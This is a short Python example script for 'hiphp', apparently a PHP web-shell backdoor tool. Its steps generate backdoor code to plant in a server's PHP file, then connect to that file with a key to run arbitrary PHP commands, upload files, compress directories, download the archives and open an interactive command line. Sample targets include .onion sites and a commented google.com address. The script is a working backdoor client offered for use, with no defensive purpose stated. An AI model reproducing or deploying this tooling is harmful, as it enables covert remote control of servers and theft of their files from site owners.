#!/usr/bin/env python
# coding:utf-8
#   |                                                         |   #
# --+---------------------------------------------------------+-- #
#   |    Code by: yasserbdj96                                 |   #
#   |    Email: yasser.bdj96@gmail.com                        |   #
#   |    GitHub: github.com/yasserbdj96                       |   #
#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
#   |                                                         |   #
#   |    All posts with #yasserbdj96                          |   #
#   |    All views are my own.                                |   #
# --+---------------------------------------------------------+-- #
#   |                                                         |   #

#START{
from hiphp import *

# connect:
p1=hiphp(key="123",url="http://127.0.0.1/hd.php")#Default: retu=False.
#p1=hiphp(key="123",url="http://kfdjlkgjflkgjdfkjgkfdjgkjdfkgjk.onion/index.php")# If you use hiphp on .onion sites, you must run tor services or tor browser.
#p1=hiphp(key="123",url="https://google.com/index.php")

# Get the hole Code:
p1.get_hole()# Copy this code into the file whose path you entered earlier. ex: https://localhost/index.php

# Example:1
# Command:
# print somting:
p1.run("echo 'this is a test';")
# create new folder:
p1.run("mkdir('upload_path');")

# Example:2
# Run code from file:
p1.run_file("./examples.php")# Run code from file.
p1.run_file("./examples.php","var1==true","var2==hiii")# Run code from file With the entry of variables.

# Example:3
# Upload a file:
p1.upload("./examples.php")# Upload a file to the current directory.
p1.upload("./examples.php","./upload_path/")# Upload a file to a specific directory.

# Example:4
# Compress a path:
#p1.compress("./")# Compress the current directory.
p1.compress("./upload_path/")# Compress a specific directory.

# Example:5
# download a file:
p1.download("upload_path.zip")# download a specific file to the current directory.
p1.download("upload_path.zip","./")# download a specific file to specific directory.

# Example:6
# Command line interface:
p1.cli()
#}END.
